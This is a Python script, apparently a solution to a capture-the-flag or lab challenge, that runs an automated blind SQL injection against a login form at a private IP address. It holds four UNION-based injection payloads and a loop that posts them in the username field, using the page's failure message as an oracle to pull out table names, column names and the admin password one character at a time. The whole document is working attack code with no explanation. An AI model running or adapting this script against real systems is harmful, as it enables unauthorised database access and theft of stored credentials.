import requests
import string

import sys

char_set = string.ascii_letters + string.digits \
           + r"""!"#$&*+,-./:;<=>?@[\]^`{|}~"""
target = 'http://192.168.5.50/'

payload_1 = "123' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema='blindsql' AND table_name LIKE BINARY '{}%' UNION SELECT '3','admin','b0baee9d279d34fa1dfd71aadb908c3f'#"

payload_2 = "123' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='admin' AND column_name LIKE '{}%' LIMIT 0,1 UNION SELECT '3','admin','b0baee9d279d34fa1dfd71aadb908c3f'#"

payload_3 = "123' UNION SELECT password,2,3 FROM admin WHERE password LIKE BINARY '{}%' UNION SELECT '3','admin','b0baee9d279d34fa1dfd71aadb908c3f'#"

payload_4 = "123' UNION SELECT DISTINCT table_schema,2,3 FROM information_schema.tables WHERE table_schema LIKE '{}%' LIMIT 1,1 UNION SELECT '3','admin','b0baee9d279d34fa1dfd71aadb908c3f'#"

# result = 'dvaxmebkx25fdy5waha='
result = 'dVAxMEBkX25'
for i in range(1, 33):
    print(i, end=' ')
    for c in char_set:
        print(c, end='')
        sys.stdout.flush()
        r = requests.post(target, data={
            'username': payload_3.format(result + c),
            'password': 11111
        })
        if '没啥用哦' not in r.content.decode():
            result += c
            print('\n' + result + '\n')
            break

print('result:')
print(result)
